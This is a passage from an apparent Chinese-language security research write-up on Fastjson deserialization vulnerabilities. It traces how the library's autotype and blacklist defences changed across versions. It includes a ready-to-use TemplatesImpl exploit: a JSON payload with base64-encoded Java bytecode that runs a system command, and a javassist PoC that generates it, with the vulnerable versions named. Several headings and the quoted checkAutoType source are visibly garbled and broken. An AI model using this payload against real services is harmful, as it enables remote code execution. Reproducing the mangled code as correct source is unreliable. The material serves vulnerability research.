    call User default Constructor
    call User setName
    call User setAge
    call User setFlag
    call User getAge
    call User isFlag
    call User getName
    parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
    parseObject反序列化:{"flag":true,"sex":"boy","name":"lala","age":11}
在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法（setAge，setName）以及对应的getter方法（getAge，getName），最终结果是一个字符串。这里还多调用了getter（注意bool类型的是is开头的）方法，是因为parseObject在没有其他参数时，调用了`JSON.toJSON(obj)`，后续会通过gettter方法获取obj属性值：
###### JSON.parseObject(serializedStr, Object.class)
    JSON.parseObject(serializedStr, Object.class)：
    call User default Constructor
    call User setName
    call User setAge
    call User setFlag
    parseObject反序列化对象名称:com.longofo.test.User
    parseObject反序列化:User{name='lala', age=11, flag=true, sex='boy', address='null'}
在指定了@type的情况下，这种写法和第一种`JSON.parse(serializedStr)`写法其实没有区别的，从结果也能看出。
###### JSON.parseObject(serializedStr, User.class)
    JSON.parseObject(serializedStr, User.class)：
    call User default Constructor
    call User setName
    call User setAge
    call User setFlag
    parseObject反序列化对象名称:com.longofo.test.User
    parseObject反序列化:User{name='lala', age=11, flag=true, sex='boy', address='null'}
在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法（setAge，setName），最终结果是User类的一个实例。这种写法明确指定了目标对象必须是User类型，如果@type对应的类型不是User类型或其子类，将抛出不匹配异常，但是，就算指定了特定的类型，依然有方式在类型匹配之前来触发漏洞。
##### 1.2.10测试
对于上面User这个类，测试结果和1.1.157一样，这里不写了。
到这个版本autotype依然默认开启。不过从这个版本开始，fastjson在ParserConfig中加入了denyList，一直到1.2.24版本，这个denyList都只有一个类（不过这个java.lang.Thread不是用于漏洞利用的）：
##### 1.2.25测试
测试结果是抛出出了异常：
    serializedStr={"@type":"com.longofo.test.User","name":"lala","age":11, "flag": true}
    -----------------------------------------------    
    JSON.parse(serializedStr)：
    Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. com.longofo.test.User
        at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:882)
        at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:322)
        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)
        at com.alibaba.fastjson.JSON.parse(JSON.java:137)
        at com.alibaba.fastjson.JSON.parse(JSON.java:128)
        at com.longofo.test.Test1.main(Test1.java:14)
从1.2.25开始，autotype默认关闭了，对于autotype开启，后面漏洞分析会涉及到。并且从1.2.25开始，增加了checkAutoType函数，它的主要作用是检测@type指定的类是否在白名单、黑名单（使用的startswith方式）
以及目标类是否是两个危险类（Classloader、DataSource）的子类或者子接口，其中白名单优先级最高，白名单如果允许就不检测黑名单与危险类，否则继续检测黑名单与危险类：
增加了黑名单类、包数量，同时增加了白名单，用户还可以调用相关方法添加黑名单/白名单到列表中：
后面的许多漏洞都是对checkAutotype以及本身某些逻辑缺陷导致的漏洞进行修复，以及黑名单的不断增加。
##### 1.2.42测试
与1.2.25一样，默认不开启autotype，所以结果一样，直接抛autotype未开启异常。
从这个版本开始，将denyList、acceptList换成了十进制的hashcode，使得安全研究难度变大了（不过hashcode的计算方法依然是公开的，假如拥有大量的jar包，例如maven仓库可以爬jar包下来，可批量的跑类名、包名，不过对于黑名单是包名的情况，要找到具体可利用的类也会消耗一些时间）：
checkAutotype中检测也做了相应的修改：
##### 1.2.61测试
与1.2.25一样，默认不开启autotype，所以结果一样，直接抛autotype未开启异常。
从1.2.25到1.2.61之前其实还发生了很多绕过与黑名单的增加，不过这部分在后面的漏洞版本线在具体写，这里写1.2.61版本主要是说明黑名单防御所做的手段。在1.2.61版本时，fastjson将hashcode从十进制换成了十六进制：
不过用十六进制表示与十进制表示都一样，同样可以批量跑jar包。在1.2.62版本为了统一又把十六进制大写：
再之后的版本就是黑名单的增加了
#### Fastjson漏洞版本线
下面漏洞不会过多的分析，太多了，只会简单说明下以及给出payload进行测试与说明修复方式。
##### versetDataSourceName方法调用->setAutocommit方法调用->context.lookup(datasourceName)调用
###### com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl利用链
payload：
    {
      "rand1": {
        "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_bytecodes": [
          "yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"
        ],
        "_name": "aaa",
        "_tfactory": {},
        "_outputProperties": {}
      }
    }
测试（jdk=8u102，fastjson=1.2.24）：
    package com.longofo.test;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.codec.binary.Base64;
    public class Test3 {
        public static void main(String[] args) throws Exception {
            String evilCode_base64 = readClass();
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String payload = "{'rand1':{" +
                    "\"@type\":\"" + NASTY_CLASS + "\"," +
                    "\"_bytecodes\":[\"" + evilCode_base64 + "\"]," +
                    "'_name':'aaa'," +
                    "'_tfactory':{}," +
                    "'_outputProperties':{}" +
                    "}}\n";
            System.out.println(payload);
            //JSON.parse(payload, Feature.SupportNonPublicField); 成功
            //JSON.parseObject(payload, Feature.SupportNonPublicField); 成功
            //JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField); 成功
            //JSON.parseObject(payload, User.class, Feature.SupportNonPublicField); 成功
        }
        public static class AaAa {
        }
        public static String readClass() throws Exception {
            ClassPool pool = ClassPool.getDefault();
            CtClass cc = pool.get(AaAa.class.getName());
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "AaAa" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
            byte[] evilCode = cc.toBytecode();
            return Base64.encodeBase64String(evilCode);
        }
    }
结果：
触发原因简析：
TemplatesImpl对象恢复->JavaBeanDeserializer.deserialze->FieldDeserializer.setValue->TemplatesImpl.getOutputProperties->TemplatesImpl.newTransformer->TemplatesImpl.getTransletInstance->通过defineTransletClasses，newInstance触发我们自己构造的class的静态代码块
简单说明：
这个漏洞需要开启SupportNonPublicField特性，这在样例测试中也说到了。因为TemplatesImpl类中`_bytecodes`、`_tfactory`、`_name`、`_outputProperties`、`_class`并没有对应的setter，所以要为这些private属性赋值，就需要开启SupportNonPublicField特性。具体这个poc构造过程，这里不分析了，可以看下廖大师傅的[这篇](http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/)，涉及到了一些细节问题。
##### ver>=1.2.25&ver checkAutoType(String typeName, Class expectClass) {
            if (typeName == null) {
                return null;
            }
            final String className = typeName.replace('$', '.');
            // 位置1，开启了autoTypeSupport，先白名单，再黑名单
            if (autoTypeSupport || expectClass != null) {
                for (int i = 0; i  clazz = TypeUtils.getClassFromMapping(typeName);
            if (clazz == null) {
                clazz = deserializers.findClass(typeName);
            }
            if (clazz != null) {
                if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
                return clazz;
            }
            // 位置3，没开启autoTypeSupport，依然会进行黑白名单检测，先黑名单，再白名单
            if (!autoTypeSupport) {
                for (int i = 0; i < denyList.length; ++i) {
                    String deny = denyList[i];
                    if (className.startsWith(deny)) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }